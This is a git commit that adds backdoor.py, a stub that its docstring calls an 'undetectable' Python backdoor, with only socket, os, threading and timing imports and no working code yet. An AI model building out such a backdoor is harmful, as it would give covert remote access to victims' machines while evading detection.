b879ade5aceef2ee6d5345ed6ae665d172116181
davoodya <davoodya40@gmail.com>
2024-11-08 23:06:28 +0330

    add docs strings and Implement Step 0: Import requires libraries

---
+++ backdoor.py
@@ -0,0 +1,19 @@
+""" Yakuza Backdoor, Undetectable
+        This is a Backdoor written in Python based on Yakuza Style
+        Version: 1.0
+------------------------------------------------------------
+Author: Davood Yakuza
+Start Developing Date: 11/8/2024 | 18 aban 1403
+End Developing Date:
+
+"""
+
+# Step 0: Import requires libraries
+
+import socket
+import os
+from time import sleep
+import threading
+from sys import exit
+
+
